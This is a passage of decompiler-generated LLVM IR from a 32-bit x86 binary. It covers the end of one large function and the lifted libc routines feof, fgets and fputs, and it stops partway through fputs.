  store i32 %v0_804eba8, i32* %v3_804eba8, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804ebaf = load i32, i32* @edx, align 4
  %v1_804ebaf = add i32 %v0_804ebaf, 28
  %v2_804ebaf = inttoptr i32 %v1_804ebaf to i32*
  store i32 1, i32* %v2_804ebaf, align 4
  %v0_804ebb6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ebb6 = load i32, i32* @edx, align 4
  %v2_804ebb6 = add i32 %v1_804ebb6, 8
  %v3_804ebb6 = inttoptr i32 %v2_804ebb6 to i32*
  store i32 %v0_804ebb6, i32* %v3_804ebb6, align 4
  %v0_804ebb9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ebc3 = and i32 %v0_804ebb9, -5
  %v0_804ebc9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ebc9 = and i32 %v0_804ebc9, 3840
  store i32 %v1_804ebc9, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804ebd2 = or i32 %v1_804ebc9, %v1_804ebc3
  store i32 %v2_804ebd2, i32* @edi, align 4
  %v1_804ebd4 = load i32, i32* @edx, align 4
  %v2_804ebd4 = add i32 %v1_804ebd4, 20
  %v3_804ebd4 = inttoptr i32 %v2_804ebd4 to i32*
  store i32 48, i32* %v3_804ebd4, align 4
  %v0_804ebd7 = load i32, i32* @edi, align 4
  %v1_804ebd7 = load i32, i32* @edx, align 4
  %v2_804ebd7 = add i32 %v1_804ebd7, 16
  %v3_804ebd7 = inttoptr i32 %v2_804ebd7 to i32*
  store i32 %v0_804ebd7, i32* %v3_804ebd7, align 4
  %v0_804ebda = load i32, i32* @ecx, align 4
  %v1_804ebda = inttoptr i32 %v0_804ebda to i8*
  %v2_804ebda = load i8, i8* %v1_804ebda, align 1
  %v3_804ebda = icmp eq i8 %v2_804ebda, 0
  %v1_804ebdd = icmp eq i1 %v3_804ebda, false
  br i1 %v1_804ebdd, label %dec_label_pc_804ebf6, label %dec_label_pc_804ebdf

dec_label_pc_804ebdf:                             ; preds = %dec_label_pc_804eb9a
  %v0_804ebdf = load i32, i32* @esi, align 4
  %v1_804ebdf = inttoptr i32 %v0_804ebdf to i8*
  %v2_804ebdf = load i8, i8* %v1_804ebdf, align 1
  %v11_804ebdf = icmp eq i8 %v2_804ebdf, 109
  %v1_804ebe2 = icmp eq i1 %v11_804ebdf, false
  br i1 %v1_804ebe2, label %dec_label_pc_804ece8, label %dec_label_pc_804ebe8

dec_label_pc_804ebe8:                             ; preds = %dec_label_pc_804ebdf
  %v0_804ebe8 = load i32, i32* @edx, align 4
  %v1_804ebe8 = add i32 %v0_804ebe8, 32
  %v2_804ebe8 = inttoptr i32 %v1_804ebe8 to i32*
  store i32 20, i32* %v2_804ebe8, align 4
  %v0_804ebef = load i32, i32* @edx, align 4
  %v1_804ebef = add i32 %v0_804ebef, 28
  %v2_804ebef = inttoptr i32 %v1_804ebef to i32*
  store i32 0, i32* %v2_804ebef, align 4
  br label %dec_label_pc_804ebf6

dec_label_pc_804ebf6:                             ; preds = %dec_label_pc_804eb9a, %dec_label_pc_804ebe8
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804ec8a, label %dec_label_pc_804ec01

dec_label_pc_804ec01:                             ; preds = %dec_label_pc_804ebf6
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_804ec42 = add i32 %tmp76, 40
  %v1_804ec7b = add i32 %tmp76, 28
  %v2_804ec7b = inttoptr i32 %v1_804ec7b to i32*
  %v4_804ec10 = add i32 %tmp76, 36
  br label %dec_label_pc_804ec03

dec_label_pc_804ec03:                             ; preds = %dec_label_pc_804ec76, %dec_label_pc_804ec01
  %v0_804ec19 = phi i32 [ 0, %dec_label_pc_804ec01 ], [ %v1_804ec7a, %dec_label_pc_804ec76 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ec01 ], [ %stack_var_-88.5, %dec_label_pc_804ec76 ]
  %v1_804ec03 = add i32 %v0_804ec19, -2
  %v6_804ec03 = sub i32 1, %v0_804ec19
  %v7_804ec03 = and i32 %v6_804ec03, %v0_804ec19
  %v8_804ec03 = icmp slt i32 %v7_804ec03, 0
  %v9_804ec03 = icmp eq i32 %v1_804ec03, 0
  %v10_804ec03 = icmp slt i32 %v1_804ec03, 0
  %v3_804ec06 = icmp eq i1 %v10_804ec03, %v8_804ec03
  %v4_804ec06 = icmp eq i1 %v9_804ec03, false
  %v5_804ec06 = and i1 %v4_804ec06, %v3_804ec06
  br i1 %v5_804ec06, label %dec_label_pc_804ec19, label %dec_label_pc_804ec08

dec_label_pc_804ec08:                             ; preds = %dec_label_pc_804ec03
  store i32 %tmp76, i32* @edx, align 4
  %v0_804ec0c = load i32, i32* @esp, align 4
  %v2_804ec0c = mul i32 %v0_804ec19, 4
  %v3_804ec0c = add i32 %v2_804ec0c, 68
  %v4_804ec0c = add i32 %v3_804ec0c, %v0_804ec0c
  %v5_804ec0c = inttoptr i32 %v4_804ec0c to i32*
  %v6_804ec0c = load i32, i32* %v5_804ec0c, align 4
  store i32 %v6_804ec0c, i32* %eax.global-to-local, align 4
  %v1_804ec10 = trunc i32 %v6_804ec0c to i8
  %v5_804ec10 = add i32 %v4_804ec10, %v0_804ec19
  %v6_804ec10 = inttoptr i32 %v5_804ec10 to i8*
  store i8 %v1_804ec10, i8* %v6_804ec10, align 1
  %v0_804ec14 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec14 = urem i32 %v0_804ec14, 256
  br label %dec_label_pc_804ec22

dec_label_pc_804ec19:                             ; preds = %dec_label_pc_804ec03
  %v5_804ec1b = add i32 %v0_804ec19, %stack_var_-32.3
  store i32 %v5_804ec1b, i32* %eax.global-to-local, align 4
  %v1_804ec1f = add i32 %v5_804ec1b, -2
  br label %dec_label_pc_804ec22

dec_label_pc_804ec22:                             ; preds = %dec_label_pc_804ec08, %dec_label_pc_804ec19
  %v0_804ec35 = phi i32 [ %v1_804ec14, %dec_label_pc_804ec08 ], [ %v1_804ec1f, %dec_label_pc_804ec19 ]
  store i32 %v0_804ec35, i32* %eax.global-to-local, align 4
  %v5_804ec22 = sub i32 %v0_804ec35, %stack_var_-88.4
  %v11_804ec22 = xor i32 %v0_804ec35, %stack_var_-88.4
  %v12_804ec22 = xor i32 %v5_804ec22, %v0_804ec35
  %v13_804ec22 = and i32 %v12_804ec22, %v11_804ec22
  %v14_804ec22 = icmp slt i32 %v13_804ec22, 0
  %v15_804ec22 = icmp eq i32 %v5_804ec22, 0
  %v16_804ec22 = icmp slt i32 %v5_804ec22, 0
  %v3_804ec26 = icmp ne i1 %v16_804ec22, %v14_804ec22
  %v4_804ec26 = or i1 %v15_804ec22, %v3_804ec26
  br i1 %v4_804ec26, label %dec_label_pc_804ec35, label %dec_label_pc_804ec28

dec_label_pc_804ec28:                             ; preds = %dec_label_pc_804ec22
  %v1_804ec28 = add i32 %v0_804ec35, -9
  %v6_804ec28 = sub i32 8, %v0_804ec35
  %v7_804ec28 = and i32 %v6_804ec28, %v0_804ec35
  %v8_804ec28 = icmp slt i32 %v7_804ec28, 0
  %v9_804ec28 = icmp eq i32 %v1_804ec28, 0
  %v10_804ec28 = icmp slt i32 %v1_804ec28, 0
  %v3_804ec2b = icmp eq i1 %v10_804ec28, %v8_804ec28
  %v4_804ec2b = icmp eq i1 %v9_804ec28, false
  %v5_804ec2b = and i1 %v4_804ec2b, %v3_804ec2b
  br i1 %v5_804ec2b, label %dec_label_pc_804ece8, label %dec_label_pc_804ec35

dec_label_pc_804ec35:                             ; preds = %dec_label_pc_804ec28, %dec_label_pc_804ec22
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804ec22 ], [ %v0_804ec35, %dec_label_pc_804ec28 ]
  %v1_804ec35 = add i32 %v0_804ec35, -1
  store i32 %v1_804ec35, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804ec3e = load i32, i32* @esp, align 4
  %v1_804ec3e = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ec3e = mul i32 %v1_804ec3e, 4
  %v3_804ec3e = add i32 %v0_804ec3e, 80
  %v4_804ec3e = add i32 %v3_804ec3e, %v2_804ec3e
  %v5_804ec3e = inttoptr i32 %v4_804ec3e to i32*
  %v6_804ec3e = load i32, i32* %v5_804ec3e, align 4
  store i32 %v6_804ec3e, i32* %edi.global-to-local, align 4
  %v2_804ec42 = mul i32 %v1_804ec35, 4
  %v4_804ec42 = add i32 %v3_804ec42, %v2_804ec42
  %v5_804ec42 = inttoptr i32 %v4_804ec42 to i32*
  %v6_804ec42 = load i32, i32* %v5_804ec42, align 4
  store i32 %v6_804ec42, i32* @eax, align 4
  %v9_804ec46 = icmp eq i32 %v6_804ec3e, 8
  br i1 %v9_804ec46, label %dec_label_pc_804ec76, label %dec_label_pc_804ec4b

dec_label_pc_804ec4b:                             ; preds = %dec_label_pc_804ec35
  %v9_804ec4b = icmp eq i32 %v6_804ec42, 8
  br i1 %v9_804ec4b, label %dec_label_pc_804ec66, label %dec_label_pc_804ec50

dec_label_pc_804ec50:                             ; preds = %dec_label_pc_804ec4b
  %v12_804ec50 = icmp eq i32 %v6_804ec42, %v6_804ec3e
  br i1 %v12_804ec50, label %dec_label_pc_804ec66, label %dec_label_pc_804ec54

dec_label_pc_804ec54:                             ; preds = %dec_label_pc_804ec50
  %v1_804ec54 = call i32 @_promoted_size(i32 %v1_804ec35)
  store i32 %v1_804ec54, i32* %ebx.global-to-local, align 4
  %v0_804ec5b = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804ec5b, i32* @eax, align 4
  %v1_804ec5d = call i32 @_promoted_size(i32 %v1_804ec35)
  store i32 %v1_804ec5d, i32* %eax.global-to-local, align 4
  %v8_804ec64 = icmp sgt i32 %v1_804ec54, %v1_804ec5d
  br i1 %v8_804ec64, label %dec_label_pc_804ec76, label %dec_label_pc_804ec54.dec_label_pc_804ec66_crit_edge

dec_label_pc_804ec54.dec_label_pc_804ec66_crit_edge: ; preds = %dec_label_pc_804ec54
  %v0_804ec6e.pre = load i32, i32* @esp, align 4
  %v1_804ec6e.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ec66

dec_label_pc_804ec66:                             ; preds = %dec_label_pc_804ec54.dec_label_pc_804ec66_crit_edge, %dec_label_pc_804ec50, %dec_label_pc_804ec4b
  %v1_804ec6e = phi i32 [ %v1_804ec6e.pre, %dec_label_pc_804ec54.dec_label_pc_804ec66_crit_edge ], [ %v1_804ec3e, %dec_label_pc_804ec50 ], [ %v1_804ec3e, %dec_label_pc_804ec4b ]
  %v0_804ec6e = phi i32 [ %v0_804ec6e.pre, %dec_label_pc_804ec54.dec_label_pc_804ec66_crit_edge ], [ %v0_804ec3e, %dec_label_pc_804ec50 ], [ %v0_804ec3e, %dec_label_pc_804ec4b ]
  store i32 %v1_804ec35, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_804ec6e = mul i32 %v1_804ec6e, 4
  %v3_804ec6e = add i32 %v0_804ec6e, 80
  %v4_804ec6e = add i32 %v3_804ec6e, %v2_804ec6e
  %v5_804ec6e = inttoptr i32 %v4_804ec6e to i32*
  %v6_804ec6e = load i32, i32* %v5_804ec6e, align 4
  store i32 %v6_804ec6e, i32* %eax.global-to-local, align 4
  store i32 %v6_804ec6e, i32* %v5_804ec42, align 4
  br label %dec_label_pc_804ec76

dec_label_pc_804ec76:                             ; preds = %dec_label_pc_804ec54, %dec_label_pc_804ec35, %dec_label_pc_804ec66
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804ec7a = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ec7a = add i32 %v0_804ec7a, 1
  store i32 %v1_804ec7a, i32* %ebp.global-to-local, align 4
  %v3_804ec7b = load i32, i32* %v2_804ec7b, align 4
  %v1_804ec7e = add i32 %v3_804ec7b, 2
  store i32 %v1_804ec7e, i32* %eax.global-to-local, align 4
  %v5_804ec83 = icmp slt i32 %v1_804ec7a, %v1_804ec7e
  br i1 %v5_804ec83, label %dec_label_pc_804ec03, label %dec_label_pc_804ecb1

dec_label_pc_804ec8a:                             ; preds = %dec_label_pc_804ebf6
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ec8e = add i32 %tmp76, 38
  %v2_804ec8e = inttoptr i32 %v1_804ec8e to i8*
  store i8 1, i8* %v2_804ec8e, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804ec97 = add i32 %tmp76, 28
  %v2_804ec97 = inttoptr i32 %v1_804ec97 to i32*
  %v3_804ec97 = load i32, i32* %v2_804ec97, align 4
  %v2_804ec9a = mul i32 %v3_804ec97, 4
  %v2_804ec9e = ptrtoint i32* %stack_var_-20 to i32
  %v1_804eca5 = add i32 %tmp76, 40
  store i32 %v1_804eca5, i32* %eax.global-to-local, align 4
  %v3_804eca9 = inttoptr i32 %v1_804eca5 to i16*
  %v4_804eca9 = call i32 @memcpy(i16* %v3_804eca9, i32 %v2_804ec9e, i32 %v2_804ec9a)
  store i32 %v4_804eca9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ecb1

dec_label_pc_804ecb1:                             ; preds = %dec_label_pc_804ec76, %dec_label_pc_804ec8a
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ec8a ], [ %stack_var_-88.5, %dec_label_pc_804ec76 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_804e95c, align 4
  %v0_804ecbc = load i32, i32* @ecx, align 4
  %v1_804ecbc = add i32 %v0_804ecbc, 16
  %v2_804ecbc = inttoptr i32 %v1_804ecbc to i8*
  %v3_804ecbc = load i8, i8* %v2_804ecbc, align 1
  %v5_804ecbc = icmp slt i8 %v3_804ecbc, 0
  br i1 %v5_804ecbc, label %dec_label_pc_804ecc9, label %dec_label_pc_804ecc2

dec_label_pc_804ecc2:                             ; preds = %dec_label_pc_804ecb1
  %v0_804ecc2 = load i32, i32* @esi, align 4
  %v1_804ecc2 = add i32 %v0_804ecc2, 1
  store i32 %v1_804ecc2, i32* %eax.global-to-local, align 4
  %v2_804ecc5 = inttoptr i32 %v0_804ecbc to i32*
  store i32 %v1_804ecc2, i32* %v2_804ecc5, align 4
  br label %dec_label_pc_804ecdc

dec_label_pc_804ecc9:                             ; preds = %dec_label_pc_804ecb1
  store i32 %v4_804e930, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804ecd1 = load i32, i32* @esi, align 4
  %v2_804ecd1 = sub i32 %v0_804ecd1, %v4_804e930
  store i32 %v2_804ecd1, i32* %esi.global-to-local, align 4
  %v1_804ecd3 = mul i32 %v2_804ecd1, 4
  %v2_804ecd3 = add i32 %v1_804ecd3, 224
  store i32 %v2_804ecd3, i32* %eax.global-to-local, align 4
  %v2_804ecda = load i32, i32* %arg1, align 4
  %v4_804ecda = add i32 %v2_804ecda, %v2_804ecd3
  store i32 %v4_804ecda, i32* %arg1, align 4
  br label %dec_label_pc_804ecdc

dec_label_pc_804ecdc:                             ; preds = %dec_label_pc_804ecc2, %dec_label_pc_804ecc9
  store i32 %tmp76, i32* @edx, align 4
  %v1_804ece0 = add i32 %tmp76, 28
  %v2_804ece0 = inttoptr i32 %v1_804ece0 to i32*
  %v3_804ece0 = load i32, i32* %v2_804ece0, align 4
  store i32 %v3_804ece0, i32* %eax.global-to-local, align 4
  %v1_804ece3 = add i32 %v3_804ece0, 2
  br label %dec_label_pc_804eceb

dec_label_pc_804ece8:                             ; preds = %dec_label_pc_804e981, %dec_label_pc_804ea1b, %dec_label_pc_804ea4e, %dec_label_pc_804eac9, %dec_label_pc_804eab5, %dec_label_pc_804eaac, %dec_label_pc_804ec28, %dec_label_pc_804ebdf, %dec_label_pc_804eb2b
  br label %dec_label_pc_804eceb

dec_label_pc_804eceb:                             ; preds = %dec_label_pc_804ecdc, %dec_label_pc_804ece8
  %storemerge6 = phi i32 [ %v1_804ece3, %dec_label_pc_804ecdc ], [ -1, %dec_label_pc_804ece8 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804ecee = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ecee, i32* @ebx, align 4
  store i32 %v0_804e92f, i32* @esi, align 4
  store i32 %v0_804e92e, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_804ec7a, { 0, 2, 1 }
  uselistorder i32 %v1_804ec35, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804ec28, { 1, 0 }
  uselistorder i32 %v5_804ec22, { 1, 2, 0 }
  uselistorder i32 %v0_804ec35, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804ec03, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804ec19, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_804eb94, { 1, 2, 0 }
  uselistorder i32 %v1_804eb6a, { 1, 2, 0 }
  uselistorder i32 %v0_804eb94, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804eb2f, { 1, 0 }
  uselistorder i32 %v1_804eb1e, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804eb27, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804eb11, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804eb07, { 1, 0 }
  uselistorder i32 %v1_804eae9, { 1, 0 }
  uselistorder i32 %v0_804eb07.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804eacc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804eac3, { 1, 2, 0 }
  uselistorder i32 %v0_804ea89, { 1, 0 }
  uselistorder i32 %v1_804ea7b, { 1, 0 }
  uselistorder i32 %v1_804ea76, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804ea74, { 2, 0, 1 }
  uselistorder i32 %v0_804ea96, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804ea31, { 1, 2, 0 }
  uselistorder i32 %v0_804ea09, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_804e9fc.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804e9f5.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_804e9ff, { 1, 2, 0 }
  uselistorder i32 %v6_804e9fd, { 0, 2, 1 }
  uselistorder i32 %v1_804e9fc, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804e9f5, { 2, 1, 0 }
  uselistorder i32 %v1_804e9ed, { 1, 0 }
  uselistorder i32 %v1_804e9f5137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_804e9e5, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_804e9d8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_804e9d3, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804e9a9, { 0, 2, 1 }
  uselistorder i32 %v2_804e998, { 1, 0 }
  uselistorder i32 %v0_804e996, { 2, 0, 1 }
  uselistorder i32 %v4_804e930, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 43, 30, 29, 31, 32, 34, 33, 44, 42, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 2, 0, 1 }
  uselistorder i32 -134570539, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8056235.199 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804eceb, { 1, 0 }
  uselistorder label %dec_label_pc_804ece8, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ecdc, { 1, 0 }
  uselistorder label %dec_label_pc_804ecb1, { 1, 0 }
  uselistorder label %dec_label_pc_804ec76, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ec22, { 1, 0 }
  uselistorder label %dec_label_pc_804ebf6, { 1, 0 }
  uselistorder label %dec_label_pc_804eb5e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804eb2b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eb02, { 1, 0 }
  uselistorder label %dec_label_pc_804ead9, { 1, 0 }
  uselistorder label %dec_label_pc_804eaa0, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804ea43, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e9fc, { 1, 0 }
  uselistorder label %dec_label_pc_804e9ed, { 1, 0 }
  uselistorder label %dec_label_pc_804e9e3, { 1, 0 }
  uselistorder label %dec_label_pc_804e9cc, { 1, 0 }
  uselistorder label %dec_label_pc_804e9cc.outer, { 2, 0, 1 }
}

define i32 @feof(i32* %arg1) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v12_804ecf7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp5, i32* %esi.global-to-local, align 4
  %v1_804ecfe = add i32 %tmp5, 52
  %v2_804ecfe = inttoptr i32 %v1_804ecfe to i32*
  %v3_804ecfe = load i32, i32* %v2_804ecfe, align 4
  %v1_804ed01 = icmp eq i32 %v3_804ecfe, 0
  %v1_804ed03 = icmp eq i1 %v1_804ed01, false
  br i1 %v1_804ed03, label %dec_label_pc_804ed24.thread, label %dec_label_pc_804ed2a

dec_label_pc_804ed24.thread:                      ; preds = %entry
  %v2_804ed2416 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804ed3b

dec_label_pc_804ed2a:                             ; preds = %entry
  %v1_804ed05 = add i32 %tmp5, 56
  store i32 %v12_804ecf7, i32* @eax, align 4
  %v2_804ed14 = call i32 @__pthread_return_void(i32 %v12_804ecf7, i32 134550743)
  %v1_804ed1c = call i32 @__pthread_return_0(i32 %v1_804ed05)
  %v0_804ed24.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804ed24 = inttoptr i32 %v0_804ed24.pre to i32*
  %v2_804ed24 = load i32, i32* %v1_804ed24, align 4
  store i32 %v12_804ecf7, i32* @eax, align 4
  %v2_804ed33 = call i32 @__pthread_return_void(i32 %v12_804ecf7, i32 1)
  br label %dec_label_pc_804ed3b

dec_label_pc_804ed3b:                             ; preds = %dec_label_pc_804ed24.thread, %dec_label_pc_804ed2a
  %v0_804ed3b = phi i32 [ %v2_804ed24, %dec_label_pc_804ed2a ], [ %v2_804ed2416, %dec_label_pc_804ed24.thread ]
  %v1_804ed40 = and i32 %v0_804ed3b, 4
  ret i32 %v1_804ed40

; uselistorder directives
  uselistorder i32 %v12_804ecf7, { 2, 3, 0, 1 }
  uselistorder i32 %tmp5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ed3b, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804ed48 = load i32, i32* @edi, align 4
  %v0_804ed49 = load i32, i32* @esi, align 4
  %v0_804ed4a = load i32, i32* @ebx, align 4
  %v12_804ed4b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804ed52 = add i32 %arg3, 52
  %v2_804ed52 = inttoptr i32 %v1_804ed52 to i32*
  %v3_804ed52 = load i32, i32* %v2_804ed52, align 4
  store i32 %v3_804ed52, i32* @edi, align 4
  %v1_804ed55 = icmp eq i32 %v3_804ed52, 0
  %v1_804ed57 = icmp eq i1 %v1_804ed55, false
  br i1 %v1_804ed57, label %entry.dec_label_pc_804ed78_crit_edge, label %dec_label_pc_804ed59

entry.dec_label_pc_804ed78_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804ed78

dec_label_pc_804ed59:                             ; preds = %entry
  %v1_804ed59 = add i32 %arg3, 56
  store i32 %v1_804ed59, i32* @ebx, align 4
  store i32 %v12_804ed4b, i32* @eax, align 4
  %v2_804ed68 = call i32 @__pthread_return_void(i32 %v12_804ed4b, i32 134550743)
  %v0_804ed6d = load i32, i32* @ebx, align 4
  %v1_804ed70 = call i32 @__pthread_return_0(i32 %v0_804ed6d)
  %v0_804ed79.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ed78

dec_label_pc_804ed78:                             ; preds = %entry.dec_label_pc_804ed78_crit_edge, %dec_label_pc_804ed59
  %v0_804ed79 = phi i32 [ %arg3, %entry.dec_label_pc_804ed78_crit_edge ], [ %v0_804ed79.pre, %dec_label_pc_804ed59 ]
  %v0_804ed78 = load i32, i32* @edx, align 4
  %v4_804ed82 = inttoptr i32 %arg1 to i8*
  %v5_804ed82 = call i32 @__GI_fgets_unlocked(i8* %v4_804ed82, i32 %arg2, i32 %v0_804ed79, i32 %v0_804ed78)
  store i32 %v5_804ed82, i32* %ebx.global-to-local, align 4
  br i1 %v1_804ed57, label %dec_label_pc_804eda1, label %dec_label_pc_804ed90

dec_label_pc_804ed90:                             ; preds = %dec_label_pc_804ed78
  store i32 %v12_804ed4b, i32* @eax, align 4
  %v2_804ed99 = call i32 @__pthread_return_void(i32 %v12_804ed4b, i32 1)
  %v0_804eda4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804eda1

dec_label_pc_804eda1:                             ; preds = %dec_label_pc_804ed78, %dec_label_pc_804ed90
  %v0_804eda4 = phi i32 [ %v5_804ed82, %dec_label_pc_804ed78 ], [ %v0_804eda4.pre, %dec_label_pc_804ed90 ]
  store i32 %v0_804ed4a, i32* @ebx, align 4
  store i32 %v0_804ed49, i32* @esi, align 4
  store i32 %v0_804ed48, i32* @edi, align 4
  ret i32 %v0_804eda4

; uselistorder directives
  uselistorder i32 %v12_804ed4b, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804eda1, { 1, 0 }
  uselistorder label %dec_label_pc_804ed78, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804edac = load i32, i32* @edi, align 4
  %v0_804edad = load i32, i32* @esi, align 4
  %v0_804edae = load i32, i32* @ebx, align 4
  %v12_804edaf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_804edb6 = add i32 %arg2, 52
  %v2_804edb6 = inttoptr i32 %v1_804edb6 to i32*
  %v3_804edb6 = load i32, i32* %v2_804edb6, align 4
  store i32 %v3_804edb6, i32* @edi, align 4
  %v1_804edb9 = icmp eq i32 %v3_804edb6, 0
  %v1_804edbb = icmp eq i1 %v1_804edb9, false
  br i1 %v1_804edbb, label %entry.dec_label_pc_804eddc_crit_edge, label %dec_label_pc_804edbd

entry.dec_label_pc_804eddc_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804eddc

dec_label_pc_804edbd:                             ; preds = %entry
  %v1_804edbd = add i32 %arg2, 56
  store i32 %v1_804edbd, i32* @ebx, align 4
  store i32 %v12_804edaf, i32* @eax, align 4
  %v2_804edcc = call i32 @__pthread_return_void(i32 %v12_804edaf, i32 134550743)
  %v0_804edd1 = load i32, i32* @ebx, align 4
  %v1_804edd4 = call i32 @__pthread_return_0(i32 %v0_804edd1)
  %v0_804edde.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804eddc

dec_label_pc_804eddc:                             ; preds = %entry.dec_label_pc_804eddc_crit_edge, %dec_label_pc_804edbd
  %v0_804edde = phi i32 [ %arg2, %entry.dec_label_pc_804eddc_crit_edge ], [ %v0_804edde.pre, %dec_label_pc_804edbd ]
  %v0_804eddc = load i32, i32* @edx, align 4
  %v4_804ede3 = inttoptr i32 %arg1 to i8*
  %v5_804ede3 = call i32 @__GI_fputs_unlocked(i8* %v4_804ede3, i32 %v0_804edde, i32 %v0_804eddc, i32 %v0_804eddc)
  store i32 %v5_804ede3, i32* %ebx.global-to-local, align 4
  br i1 %v1_804edbb, label %dec_label_pc_804ee02, label %dec_label_pc_804edf1

dec_label_pc_804edf1:                             ; preds = %dec_label_pc_804eddc
  store i32 %v12_804edaf, i32* @eax, align 4
  %v2_804edfa = call i32 @__pthread_return_void(i32 %v12_804edaf, i32 1)
